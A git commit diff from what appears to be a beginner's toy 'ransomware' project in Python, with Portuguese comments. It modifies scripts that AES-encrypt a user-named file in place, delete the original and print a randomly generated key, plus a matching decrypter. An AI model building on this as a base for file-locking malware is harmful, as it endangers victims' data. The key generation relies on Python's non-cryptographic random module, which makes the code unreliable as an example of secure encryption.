8bff8489efc5f0d469793b0e4b45424a675501f3
Emanuel de lima alves <102486201+Mauel-lima@users.noreply.github.com>
2025-03-26 00:50:08 -0300

    Adicionando os arquivos modificados
    Moficações feitas
    Input para o nome do arquivo
    random para a criação da chave de criptografia

--- decrypter.py
+++ decrypter.py
@@ -1,22 +1,25 @@
+#Importações Necessárias
 import os
 import pyaes
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
+#Abrir arquivo
+file_name = input("Escreva o nome do arquivo para descriptografar: ")
+file = open(file_name, 'rb')
 file_data = file.read()
 file.close()
 
-## chave para descriptografia
-key = b"testeransomwares"
+#Definir chave para descriptografia
+key = input("Cole sua chave de descriptografia: ")
+key = key.encode('utf-8')
 aes = pyaes.AESModeOfOperationCTR(key)
 decrypt_data = aes.decrypt(file_data)
 
-## remover o arquivo criptografado
+#Excluir arquivo original
 os.remove(file_name)
 
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
+#Salvar arquivo
+new_file = file_name
+new_file = open(f'{new_file}', 'wb')
 new_file.write(decrypt_data)
 new_file.close()
+print("Arquivo descriptografado.")
--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,40 @@
+#Importações Necessárias
 import os
 import pyaes
+import random
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
+randomkey = ""
+
+#Abrir arquivo
+file_name = input("Escreva o nome do arquivo para criptografar: ")
+file = open(file_name, 'rb')
 file_data = file.read()
 file.close()
 
-## remover o arquivo
+#Excluir arquivo original
 os.remove(file_name)
 
-## chave de criptografia
-key = b"testeransomwares"
+
+#Definir chave de Encriptação
+#Gerar chave de aleatória
+for i in range (16):
+    c1 = chr(random.randint(ord('a'), ord('z')))
+    c2 = chr(random.randint(ord('A'), ord('Z')))
+    c3 = random.randint(0,9)
+    c4 = chr(random.randint(ord('a'), ord('z')))
+    cfinal = random.choice([c1, c2, c3, c4])
+    randomkey += str(cfinal)
+key = randomkey.encode('utf-8')
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
+#Criptografando o arquivo
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
+#Salvar arquivo
+new_file = file_name
+new_file = open(f'{new_file}', 'wb')
 new_file.write(crypto_data)
 new_file.close()
+print(f'Sua chave de criptografia é: {randomkey}')
+print("Copie ela e não perca, \npois sem ela não será possível decriptografar o arquivo")
+print("Arquivo criptografado")
